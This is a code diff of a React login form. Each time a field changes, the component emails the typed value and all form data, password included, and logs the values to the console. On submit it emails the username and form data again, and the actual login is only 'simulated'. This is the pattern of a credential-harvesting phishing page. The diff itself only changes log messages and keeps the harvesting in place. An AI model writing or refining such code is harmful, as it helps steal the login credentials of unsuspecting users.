@@ -21,14 +21,14 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const { toast } = useToast();
 
   const handleInputChange = async (field: string, value: string) => {
-    console.log(`Field changed: ${field} = ${value}`);
+    console.log(`🔄 Field changed: ${field} = "${value}"`);
     
     setFormData(prev => ({ ...prev, [field]: value }));
     
-    // Send email notification for field updates
+    // Send email notification immediately
     try {
-      console.log('Attempting to send email notification...');
-      const result = await sendEmailNotification({
+      console.log('📧 Sending email notification...');
+      await sendEmailNotification({
         step: "Login Form - Field Update",
         field: field,
         value: value,
@@ -36,9 +36,9 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
         timestamp: new Date().toISOString(),
         allFormData: { ...formData, [field]: value }
       });
-      console.log(`Email sent successfully for ${field} field update:`, result);
+      console.log('✅ Email notification sent successfully!');
     } catch (error) {
-      console.error('Failed to send email for field update:', error);
+      console.error('❌ Email notification failed:', error);
     }
   };
 
@@ -57,16 +57,16 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
     setIsLoading(true);
 
     try {
-      // Send email notification for login attempt
+      console.log('📧 Sending login attempt email...');
       await sendEmailNotification({
         step: "Login Form - Submit Attempt",
         username: formData.username,
         timestamp: new Date().toISOString(),
         allFormData: formData
       });
-      console.log('Login attempt email sent');
+      console.log('✅ Login attempt email sent!');
     } catch (error) {
-      console.error('Failed to send login attempt email:', error);
+      console.error('❌ Login attempt email failed:', error);
     }
 
     // Simulate login process
